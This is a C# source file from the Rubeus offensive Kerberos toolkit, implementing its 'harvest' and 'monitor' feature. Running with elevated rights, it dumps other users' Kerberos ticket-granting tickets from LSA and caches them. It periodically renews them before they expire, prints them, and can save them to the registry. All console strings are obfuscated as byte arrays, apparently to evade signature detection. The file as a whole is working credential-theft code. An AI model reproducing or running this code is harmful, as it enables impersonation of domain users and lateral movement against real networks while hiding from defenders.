using System;
using System.Collections.Generic;
using System.Threading;
using Rubeus.lib.Interop;

namespace Rubeus
{
    public class Harvest
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

        private readonly List<KRB_CRED> harvesterTicketCache = new List<KRB_CRED>();
        private readonly int monitorIntervalSeconds;
        private readonly int displayIntervalSeconds;
        private readonly string targetUser;
        private readonly bool renewTickets;
        private readonly string registryBasePath;
        private readonly bool nowrap;
        private readonly int runFor;
        private DateTime lastDisplay;
        private DateTime collectionStart;

        public Harvest(int monitorIntervalSeconds, int displayIntervalSeconds, bool renewTickets, string targetUser, string registryBasePath, bool nowrap, int runFor)
        {
            this.monitorIntervalSeconds = monitorIntervalSeconds;
            this.displayIntervalSeconds = displayIntervalSeconds;
            this.renewTickets = renewTickets;
            this.targetUser = targetUser;
            this.registryBasePath = registryBasePath;
            this.lastDisplay = DateTime.Now;
            this.collectionStart = DateTime.Now;
            this.nowrap = nowrap;
            this.runFor = runFor;
        }

        public void HarvestTicketGrantingTickets()
        {
            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 104, 97, 118, 101, 32, 97, 110, 32, 101, 108, 101, 118, 97, 116, 101, 100, 32, 99, 111, 110, 116, 101, 120, 116, 32, 116, 111, 32, 100, 117, 109, 112, 32, 111, 116, 104, 101, 114, 32, 117, 115, 101, 114, 115, 39, 32, 75, 101, 114, 98, 101, 114, 111, 115, 32, 116, 105, 99, 107, 101, 116, 115, 32, 58, 40, 32, 13, 10 }));
                return;
            }

            // get the current set of TGTs
            while (true)
            {
                // extract out the TGTs (service = krbtgt_ w/ full data, silent enumeration
                List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(true, new LUID(), S(new byte[] { 107, 114, 98, 116, 103, 116 }), this.targetUser, null, true, true);
                List<KRB_CRED> currentTickets = new List<KRB_CRED>();
                foreach(var sessionCred in sessionCreds)
                {
                    foreach(var ticket in sessionCred.Tickets)
                    {
                        currentTickets.Add(ticket.KrbCred);
                    }
                }

                if (renewTickets) {
                    // "harvest" mode - so don't display new tickets as they come in
                    AddTicketsToTicketCache(currentTickets, false);

                    // check if we're at a new display interval
                    if(lastDisplay.AddSeconds(this.displayIntervalSeconds) < DateTime.Now.AddSeconds(1))
                    {
                        this.lastDisplay = DateTime.Now;
                        // refresh/renew everything in the cache and display the working set
                        RefreshTicketCache(true);
                        Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 83, 108, 101, 101, 112, 105, 110, 103, 32, 117, 110, 116, 105, 108, 32 }) + DateTime.Now.AddSeconds(displayIntervalSeconds) + S(new byte[] { 32, 40 }) + displayIntervalSeconds + S(new byte[] { 32, 115, 101, 99, 111, 110, 100, 115, 41, 32, 102, 111, 114, 32, 110, 101, 120, 116, 32, 100, 105, 115, 112, 108, 97, 121, 13, 10 }));
                    }
                    else
                    {
                        // refresh/renew everything in the cache, but don't display the working set
                        RefreshTicketCache();
                    }
                }
                else
                {
                    // "monitor" mode - display new ticketson harvest
                    AddTicketsToTicketCache(currentTickets, true);
                }

                if (registryBasePath != null)
                {
                    LSA.SaveTicketsToRegistry(harvesterTicketCache, registryBasePath);
                }

                if (runFor > 0)
                {
                    // compares execution start time + time entered to run the harvest for against current time to determine if we should exit
                    if (collectionStart.AddSeconds(this.runFor) < DateTime.Now)
                    {
                        Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 67, 111, 109, 112, 108, 101, 116, 101, 100, 32, 114, 117, 110, 110, 105, 110, 103, 32, 102, 111, 114, 32 }) + runFor + S(new byte[] { 32, 115, 101, 99, 111, 110, 100, 115, 44, 32, 101, 120, 105, 116, 105, 110, 103, 13, 10 }));
                        System.Environment.Exit(0);
                    }
                }

                // If a runFor time is set and the monitoring interval is longer than the time remaining on the run, 
                // the sleep interval will be adjusted down to however much time left in the run there is. 
                if (runFor > 0 && collectionStart.AddSeconds(this.runFor) < DateTime.Now.AddSeconds(monitorIntervalSeconds))
                {
                    TimeSpan t = collectionStart.AddSeconds(this.runFor + 1) - DateTime.Now;
                    Thread.Sleep((int)t.TotalSeconds * 1000);
                }
                // else we'll do a normal monitor interval sleep
                else
                {
                    Thread.Sleep(monitorIntervalSeconds * 1000);
                }
            }
        }

        private void AddTicketsToTicketCache(List<KRB_CRED> tickets, bool displayNewTickets)
        {
            // adds a list of KRB_CREDs to the internal cache
            //  displayNewTickets - display new TGTs as they're added, e.g. "monitor" mode

            bool newTicketsAdded = false;

            if (tickets == null)
                throw new ArgumentNullException(nameof(tickets));

            foreach (var ticket in tickets)
            {
                var newTgtBytes = Convert.ToBase64String(ticket.RawBytes);

                var ticketInCache = false;

                foreach (var cachedTicket in harvesterTicketCache)
                {
                    // check the base64 of the raw ticket bytes to see if we've seen it before
                    if (Convert.ToBase64String(cachedTicket.RawBytes) == newTgtBytes)
                    {
                        ticketInCache = true;
                        break;
                    }
                }

                if (ticketInCache)
                    continue;

                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(ticket.enc_part.ticket_info[0].endtime);

                if (endTime < DateTime.Now)
                {
                    // skip if the ticket is expired
                    continue;
                }

                harvesterTicketCache.Add(ticket);
                newTicketsAdded = true;

                if (displayNewTickets)
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32 }) + DateTime.Now.ToUniversalTime() + S(new byte[] { 32, 85, 84, 67, 32, 45, 32, 70, 111, 117, 110, 100, 32, 110, 101, 119, 32, 84, 71, 84, 58, 13, 10 }));
                    LSA.DisplayTicket(ticket, 2, true, true, false, this.nowrap);
                }
            }

            if(displayNewTickets && newTicketsAdded)
                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 84, 105, 99, 107, 101, 116, 32, 99, 97, 99, 104, 101, 32, 115, 105, 122, 101, 58, 32 }) + harvesterTicketCache.Count + S(new byte[] { 13, 10 }));
        }

        private void RefreshTicketCache(bool display = false)
        {
            // goes through each ticket in the cache, removes any tickets that have expired
            //  and renews any tickets that are going to expire before the next check interval
            //  then displays the current "active" ticket cache if "display" is passed as true

            if (display)
                Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 82, 101, 102, 114, 101, 115, 104, 105, 110, 103, 32, 84, 71, 84, 32, 116, 105, 99, 107, 101, 116, 32, 99, 97, 99, 104, 101, 32, 40 }) + DateTime.Now + S(new byte[] { 41, 13, 10 }));

            for (var i = harvesterTicketCache.Count - 1; i >= 0; i--)
            {
                var endTime = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].endtime);
                var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(harvesterTicketCache[i].enc_part.ticket_info[0].renew_till);
                var userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
                var domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;

                // check if the ticket has now expired
                if (endTime < DateTime.Now)
                {
                    Console.WriteLine(S(new byte[] { 91, 33, 93, 32, 82, 101, 109, 111, 118, 105, 110, 103, 32, 84, 71, 84, 32, 102, 111, 114, 32 }) + userName + S(new byte[] { 64 }) + domainName + S(new byte[] { 13, 10 }));
                    // remove the ticket from the cache
                    Console.WriteLine(S(new byte[] { 104, 97, 114, 118, 101, 115, 116, 101, 114, 84, 105, 99, 107, 101, 116, 67, 97, 99, 104, 101, 32, 99, 111, 117, 110, 116, 58, 32 }) + harvesterTicketCache.Count);
                    harvesterTicketCache.RemoveAt(i);
                    Console.WriteLine(S(new byte[] { 104, 97, 114, 118, 101, 115, 116, 101, 114, 84, 105, 99, 107, 101, 116, 67, 97, 99, 104, 101, 32, 99, 111, 117, 110, 116, 58, 32 }) + harvesterTicketCache.Count);
                }

                else
                {
                    // check if the ticket is going to expire before the next interval checkin
                    //  but we'll still be in the renew window
                    if ( (endTime < DateTime.Now.AddSeconds(monitorIntervalSeconds)) && (renewTill > DateTime.Now.AddSeconds(monitorIntervalSeconds)) )
                    {
                        // renewal limit after checkin interval, so renew the TGT
                        userName = harvesterTicketCache[i].enc_part.ticket_info[0].pname.name_string[0];
                        domainName = harvesterTicketCache[i].enc_part.ticket_info[0].prealm;

                        Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 82, 101, 110, 101, 119, 105, 110, 103, 32, 84, 71, 84, 32, 102, 111, 114, 32 }) + userName + S(new byte[] { 64 }) + domainName + S(new byte[] { 13, 10 }));
                        var bytes = Renew.TGT(harvesterTicketCache[i], S(new byte[] { }), false, S(new byte[] { }), false);
                        var renewedCred = new KRB_CRED(bytes);
                        harvesterTicketCache[i] = renewedCred;
                    }

                    if (display)
                        LSA.DisplayTicket(harvesterTicketCache[i], 2, true, true, false, this.nowrap);
                }

            }

            if (display)
                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 84, 105, 99, 107, 101, 116, 32, 99, 97, 99, 104, 101, 32, 115, 105, 122, 101, 58, 32 }) + harvesterTicketCache.Count);
        }

    }
}
